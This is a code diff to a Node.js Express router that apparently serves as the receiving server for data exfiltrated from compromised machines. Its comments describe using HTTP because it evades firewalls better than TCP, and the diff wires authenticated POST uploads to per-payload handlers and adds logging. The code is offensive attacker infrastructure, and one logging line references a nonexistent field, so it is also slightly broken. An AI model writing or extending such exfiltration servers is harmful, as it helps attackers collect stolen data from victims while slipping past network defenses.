@@ -2,6 +2,7 @@ const express = require('express');
 const EXE_DATAS = require("./exe_datas.js");
 const Auth = require("./auth.js");
 const { genAsciiStr } = require("./util.js");
+const logging = require("./logging.js");
 
 // This router will handle the POST requests that are usually used to exfiltrate data from a server
 // Basically, exfiltration via HTTP since that's less sus than TCP, and it'd be dumb for firewalls to block Port 80
@@ -11,20 +12,43 @@ const postReqRouter = express.Router({
 
 // Create a middleware that checks for authentication.
 // This is the same setup as get_req.js
-postReqRouter.get("*", (request, response, next) => {
+postReqRouter.post("*", (request, response, next) => {
     
     let authKey = Auth.postKeys.getWithHash(request.headers.authorization);
     
-    if (authKey == null)
+    if (authKey != null)
     {
-        // If unauthorized, send a random 64 bit ASCII
-        response.status(401);
-        response.send(genAsciiStr(64));
+        // If authorized, check if the authkey matches the POST type we are looking for
+        if (authKey.usage == request.headers.exe)
+        {
+            // If authorized, invoke the EXE's POST function.
+            // @see ./exe_datas.js
+            
+            EXE_DATAS[authKey.usage].postFunction(request);
+        }
+        else
+        {
+            // If they differ, that means something went wrong. This is potentially a red flag
+            logging.log(`🔨🚩 POST Request from ${request.ip} with requested key ${request.headers.authorization}\
+            has mismatch between usage (${authKey.usage}) and requested POST EXE (${authKey.headers.exe}).`);
+        }
     }
     else
     {
-        next();
+        // If unauthorized, determine whether it's due to a lack of AUTH code or a wrong auth code.
+        if (request.headers.authorization == null)
+        {
+            logging.log(`🔨 Error: No POST request auth key provided by ${request.ip}`);
+        }
+        else
+        {
+            // Deliberately wrong auth code - might want to look into
+            logging.log(`🔨🚩 Error in authenticating POST request from ${request.ip} using requested key - ${request.headers.authorization}.`);
+        }
     }
+
+    // End the response. No point in sending back random ASCII strings after this since it's a POST request.
+    response.end();
 });
 
 module.exports = postReqRouter;
